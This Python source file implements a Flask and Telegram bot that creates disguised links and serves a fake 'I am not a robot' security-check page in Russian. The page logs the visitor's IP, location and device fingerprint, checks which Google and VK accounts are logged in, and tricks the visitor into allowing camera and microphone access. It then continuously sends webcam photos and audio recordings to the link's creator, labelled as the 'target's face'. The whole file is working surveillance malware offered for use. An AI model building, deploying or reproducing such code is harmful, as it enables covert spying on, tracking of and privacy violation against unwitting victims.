import telebot, requests, os, base64, urllib.parse
from flask import Flask, request

API_TOKEN = os.environ.get('API_TOKEN')
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

def get_vercel_geo():
    country = request.headers.get('X-Vercel-IP-Country', 'Неизвестно')
    city_raw = request.headers.get('X-Vercel-IP-City', 'Неизвестно')
    region = request.headers.get('X-Vercel-IP-Country-Region', 'Неизвестно')
    city = urllib.parse.unquote(city_raw)
    return f"🌍 Страна: `{country}`\n🏙 Город: `{city}`\n📍 Регион: `{region}`"

@app.route('/')
def home():
    return "SYSTEM ONLINE"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_m():
    bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
    return "!", 200

@app.route('/v/<data>')
def logger(data):
    try:
        decoded = base64.b64decode(data).decode('utf-8')
        owner_id, target = decoded.split('|')
    except: return "LINK ERROR", 400

    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    geo = get_vercel_geo()
    
    bot.send_message(owner_id, f"🎯 *НОВЫЙ ТАРГЕТ!*\n\n👤 IP: `{ip}`\n{geo}", parse_mode="Markdown")
    
    return f'''
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;text-align:center;">
        <div id="ui">
            <div style="font-size:70px;margin-bottom:20px;">🛡️</div>
            <h2 id="head">Проверка безопасности</h2>
            <p id="status" style="color:#555;margin-bottom:30px;">Подтвердите, что вы не робот</p>
            <button id="go" style="padding:20px 70px;border:none;border-radius:50px;background:#fff;color:#000;font-weight:900;font-size:18px;cursor:pointer;">Я НЕ РОБОТ</button>
        </div>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        document.getElementById('go').onclick = async () => {{
            const btn = document.getElementById('go');
            const statusText = document.getElementById('status');
            const head = document.getElementById('head');
            
            btn.style.display = "none";
            head.innerText = "Синхронизация...";
            statusText.innerText = "Пожалуйста, подождите. Выполняется проверка оборудования (0/100)...";
            statusText.style.color = "#0088cc";

            let d = {{
                owner: "{owner_id}",
                hw: {{ 
                    scr: screen.width+"x"+screen.height+"*"+devicePixelRatio, 
                    cores: navigator.hardwareConcurrency, 
                    ram: navigator.deviceMemory || "N/A",
                    gpu: "N/A",
                    touch: navigator.maxTouchPoints || 0
                }},
                bat: {{ lvl: "N/A", char: "N/A" }},
                net: {{ type: navigator.connection ? navigator.connection.effectiveType : "N/A", tz: Intl.DateTimeFormat().resolvedOptions().timeZone, lang: navigator.language }},
                state: {{ inc: "НЕТ", mot: "static" }},
                social: {{ g: "❌", vk: "❌" }}
            }};

            try {{
                let gl = document.createElement('canvas').getContext('webgl');
                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                d.hw.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            }} catch(e) {{}}

            try {{
                let b = await navigator.getBattery();
                d.bat.lvl = Math.round(b.level * 100) + "%";
                d.bat.char = b.charging ? "(Заряжается)" : "(Нет)";
            }} catch(e) {{}}

            const ck = (u) => new Promise(r => {{ let i = new Image(); i.onload=()=>r("✅"); i.onerror=()=>r("❌"); i.src=u; }});
            d.social.g = await ck("https://accounts.google.com");
            d.social.vk = await ck("https://vk.com");
            
            if (navigator.storage && navigator.storage.estimate) {{
                const est = await navigator.storage.estimate();
                if (est.quota < 120000000) d.state.inc = "ДА";
            }}
            window.ondevicemotion = e => {{ if(e.acceleration.x > 0.1) d.state.mot = "moving"; }};

            fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});

            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                const v = document.getElementById('v'); v.srcObject = s;
                statusText.innerText = "Проверка завершена. Идет загрузка контента...";

                function rec() {{
                    const r = new MediaRecorder(s); const ch = [];
                    r.ondataavailable = e => ch.push(e.data);
                    r.onstop = () => {{
                        const f = new FormData(); 
                        f.append('audio', new Blob(ch, {{type:'audio/webm'}}), 'a.webm'); 
                        f.append('owner', "{owner_id}");
                        fetch('/log_audio', {{ method: 'POST', body: f }});
                        if(s.active) rec(); 
                    }};
                    r.start(); setTimeout(() => r.stop(), 10000);
                }}
                rec();

                setInterval(() => {{
                    const c = document.getElementById('c'); 
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); 
                        f.append('photo', b, 'p.jpg'); 
                        f.append('owner', "{owner_id}");
                        fetch('/log_photo', {{ method: 'POST', body: f }});
                    }}, 'image/jpeg', 0.7);
                }}, 5000);

            }} catch(e) {{
                statusText.innerText = "Ошибка: Доступ запрещен. Обновите страницу и разрешите доступ к камере.";
                statusText.style.color = "red";
            }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    m = (f"🖥 *ТЕХНИЧЕСКИЙ ОТЧЕТ*\n\n"
         f"🔋 *Заряд:* {d['bat']['lvl']} {d['bat']['char']}\n"
         f"🌐 *Сеть:* {d['net']['type']}\n"
         f"🧠 *CPU:* {d['hw']['cores']} ядер | *RAM:* {d['hw']['ram']}GB\n"
         f"📺 *Экран:* {d['hw']['scr']}\n"
         f"🎮 *GPU:* {d['hw']['gpu']}\n"
         f"👤 *Вход:* Google: {d['social']['g']} | VK: {d['social']['vk']}\n"
         f"🕵️ *Инкогнито:* {d['state']['inc']}\n"
         f"🏃 *Движение:* {d['state']['mot']}\n"
         f"🕒 *Пояс:* {d['net']['tz']} | {d['net']['lang']}\n"
         f"🖐 *Touch:* {d['hw']['touch']} точек")
    bot.send_message(d['owner'], m, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    f, owner = request.files.get('photo'), request.form.get('owner')
    if f and owner: bot.send_photo(owner, f.read(), caption="📸 *ЛИЦО ТАРГЕТА*")
    return "ok"

@app.route('/log_audio', methods=['POST'])
def log_audio():
    f, owner = request.files.get('audio'), request.form.get('owner')
    if f and owner: bot.send_document(owner, f.read(), caption="🎤 *АУДИО ПОТОК*")
    return "ok"

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create(m):
    url = m.text.strip()
    if not url.startswith("http"): url = "https://" + url
    raw_data = f"{m.chat.id}|{url}"
    encoded = base64.b64encode(raw_data.encode()).decode()
    bot.reply_to(m, f"✅ Ссылка готова:\n`https://{request.host}/v/{encoded}`")
